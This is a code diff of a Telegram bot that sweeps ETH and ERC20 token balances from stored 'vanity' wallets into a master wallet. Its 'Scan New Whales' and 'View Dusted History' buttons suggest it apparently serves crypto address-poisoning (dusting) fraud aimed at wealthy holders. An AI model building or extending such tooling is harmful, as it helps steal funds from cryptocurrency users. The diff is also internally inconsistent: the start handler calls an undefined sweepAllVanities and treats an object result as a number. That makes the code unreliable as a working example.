@@ -86,61 +86,53 @@ async function sweepEverything(ctx) {
     for (const target of targets) {
         try {
             const vanityWallet = new ethers.Wallet(target.vanityPrivateKey, provider);
-            const ethBalance = await provider.getBalance(vanityWallet.address);
             
+            // --- STEP 1: Sweep Tokens ---
             for (const [symbol, info] of Object.entries(TOKENS)) {
                 const tokenContract = new ethers.Contract(info.addr, ERC20_ABI, vanityWallet);
-                const tokenBalance = await tokenContract.balanceOf(vanityWallet.address);
+                const balance = await tokenContract.balanceOf(vanityWallet.address);
 
-                if (tokenBalance > 0n) {
-                    const feeData = await provider.getFeeData();
+                if (balance > 0n) {
+                    // Estimate gas for token transfer (approx 65,000 gas)
+                    const gasPrice = (await provider.getFeeData()).gasPrice;
                     const gasLimit = 65000n; 
-                    const requiredGas = feeData.gasPrice * gasLimit;
-
-                    // --- SELF-FUELING LOGIC ---
-                    // If vanity has tokens but NOT enough ETH for gas
-                    if (ethBalance < requiredGas) {
-                        const topUpAmount = requiredGas + ethers.parseEther("0.0005"); // Gas + buffer
-                        const fuelTx = await masterWallet.sendTransaction({
-                            to: vanityWallet.address,
-                            value: topUpAmount
-                        });
-                        await fuelTx.wait();
-                        // Wait briefly for provider to sync balance
-                        await new Promise(r => setTimeout(r, 2000));
+                    
+                    // Only sweep if the vanity has enough ETH to pay for the token gas
+                    const ethBalance = await provider.getBalance(vanityWallet.address);
+                    if (ethBalance > (gasPrice * gasLimit)) {
+                        const tx = await tokenContract.transfer(masterWallet.address, balance);
+                        await tx.wait();
+                        tokensRecovered.push(`${ethers.formatUnits(balance, info.dec)} ${symbol}`);
                     }
-
-                    // Now perform the token sweep
-                    const tx = await tokenContract.transfer(masterWallet.address, tokenBalance);
-                    await tx.wait();
-                    tokensRecovered.push(`${ethers.formatUnits(tokenBalance, info.dec)} ${symbol}`);
                 }
             }
 
-            // --- FINAL ETH SWEEP ---
+            // --- STEP 2: Sweep Remaining ETH ---
             const finalEthBal = await provider.getBalance(vanityWallet.address);
-            const feeData = await provider.getFeeData();
-            const ethGasLimit = 21000n;
-            const ethGasCost = feeData.gasPrice * ethGasLimit;
+            if (finalEthBal > ethers.parseEther("0.001")) {
+                const feeData = await provider.getFeeData();
+                const gasLimit = 21000n;
+                const gasCost = feeData.gasPrice * gasLimit;
+                const valueToSend = finalEthBal - gasCost;
 
-            if (finalEthBal > ethGasCost) {
-                const valueToSend = finalEthBal - ethGasCost;
-                const tx = await vanityWallet.sendTransaction({
-                    to: masterWallet.address,
-                    value: valueToSend,
-                    gasLimit: ethGasLimit,
-                    gasPrice: feeData.gasPrice
-                });
-                await tx.wait();
-                totalEthRecovered += parseFloat(ethers.formatEther(valueToSend));
+                if (valueToSend > 0n) {
+                    const tx = await vanityWallet.sendTransaction({
+                        to: masterWallet.address,
+                        value: valueToSend,
+                        gasLimit: gasLimit,
+                        gasPrice: feeData.gasPrice
+                    });
+                    await tx.wait();
+                    totalEthRecovered += parseFloat(ethers.formatEther(valueToSend));
+                }
             }
 
-            // Mark as recovered
+            // Once fully cleared, remove the key so we don't scan it again
             target.vanityPrivateKey = null;
             await target.save();
 
         } catch (e) {
-            console.error(`Fueling/Sweep failed for ${target.address}:`, e.message);
+            console.error(`Sweep failed for ${target.address}:`, e.message);
         }
     }
     return { eth: totalEthRecovered, tokens: tokensRecovered };
@@ -148,25 +140,18 @@ async function sweepEverything(ctx) {
 
 // --- 5. Bot Commands ---
 bot.start(async (ctx) => {
-    await ctx.reply("🧹 **Phase 1: Recovery Mode**\nCleaning up all vanity addresses...");
-    const report = await sweepEverything();
-
-    const ethBal = await provider.getBalance(masterWallet.address);
-    let portfolio = `💰 **Master Portfolio**\nETH: ${parseFloat(ethers.formatEther(ethBal)).toFixed(4)}\n`;
+    await ctx.reply("🧹 **Phase 1: Sweeping leftover funds...**");
+    const recovered = await sweepAllVanities(ctx);
     
-    // Add Token Balances to View
-    for (const [symbol, info] of Object.entries(TOKENS)) {
-        const contract = new ethers.Contract(info.addr, ERC20_ABI, provider);
-        const b = await contract.balanceOf(masterWallet.address);
-        if (b > 0n) portfolio += `${symbol}: ${ethers.formatUnits(b, info.dec)}\n`;
-    }
-
-    let recoveryMsg = `✅ **Swept:** ${report.eth.toFixed(5)} ETH`;
-    if (report.tokens.length > 0) recoveryMsg += `\n🎁 **Tokens:** ${report.tokens.join(', ')}`;
-
-    await ctx.reply(`${recoveryMsg}\n\n${portfolio}`, Markup.inlineKeyboard([
-        [Markup.button.callback('🔍 Scan Whales', 'scan')]
-    ]));
+    const bal = await provider.getBalance(masterWallet.address);
+    const eth = ethers.formatEther(bal);
+    
+    await ctx.reply(`✨ **Recovery Complete**\nRecovered: ${recovered.toFixed(4)} ETH\n\nTotal Master Balance: ${eth} ETH`, 
+        Markup.inlineKeyboard([
+            [Markup.button.callback('🔍 Scan New Whales', 'scan')],
+            [Markup.button.callback('📜 View Dusted History', 'history')]
+        ])
+    );
 });
 
 bot.action('scan', async (ctx) => {
